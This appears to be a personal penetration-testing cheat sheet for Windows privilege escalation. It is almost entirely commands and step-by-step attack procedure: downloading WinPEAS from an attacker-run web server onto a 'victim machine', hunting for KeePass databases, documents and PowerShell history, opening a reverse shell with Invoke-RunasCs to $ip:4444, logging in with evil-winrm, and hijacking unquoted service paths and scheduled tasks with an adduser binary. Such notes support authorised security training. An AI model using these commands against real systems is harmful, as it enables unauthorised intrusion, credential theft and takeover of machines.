https://lolbas-project.github.io/# - can be used for some binaries
## WinPEAS
https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
```
How to use winPEAS:
1. start a http server on kali in ~/Documents/tools with command python3 -m http.server 80
2. go into powershell and run the following command iwr -uri http://$ip/winPEASx64.exe -Outfile winPEAS.exe
3. verify that winPEAS is now in victim machine and execute it to start enumerating
4. to save the output to a file do .\winPEAS.exe > C:\Users\[username]\output.txt
```
## Enumeration
```
Username and hostname
whoami

Privileges of Current User
whoami /priv

Group memberships of the current user
whoami /groups

From here on, ALL POWERSHELL
Existing users and groups
Get-LocalUser
Get-LocalGroup
To view members of a group, Get-LocalGroupMember [groupname]

Operating system, version and architecture
systeminfo

Network information
ipconfig /all
route print
netstat -ano

Installed applications
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Running processes
Get-Process

Searching for Sensitive Information
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue (if there is KeePass)
Get-ChildItem -Path C:\Users -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

Obtaining History from PS or PSReadline
Get-History
(Get-PSReadlineOption).HistorySavePath (read the file afterwards)

```
## In the Case of no RDP on a user
```
On Kali, start web server in Desktop/tools
On the shell, get the file Invoke-RunasCs.ps1 and run the following commands on powershell:

import-module ./Invoke-RunasCs.ps1
Invoke-RunasCs -Username [user] -Password [password] -Command cmd.exe -Remote $ip:4444
```
## Using evil-winrm for shell
```
evil-winrm -i $ip -u $user -p "$password"
```
## Permission Mask
F: Full Access
M: Modify Access
RX: Read and Execute Access
R: Read-only access
W: Write-only access

```
To check what permissions each groups have on files
icacls "[path]"
```
## Unquoted Service Paths
```
Getting a list of all running and stopped services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName

To get a list of services with spaces and missing quotes in binary path
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """ (run this in cmd, not ps)

From there, enumerate the relative paths one at at a time to see which folder allows the user to have write access

Then follow adduser.exe in binary hijacking to escalate
```
## Scheduled Tasks
```
To list all scheduled tasks
schtasks /query /fo LIST /v

look out for task that is running in current user but executed by an admin (this helps to let us execute adduser.exe as an admin to allow new user to escalate)

follow adduser.exe in binary hijacking to escalate
```
```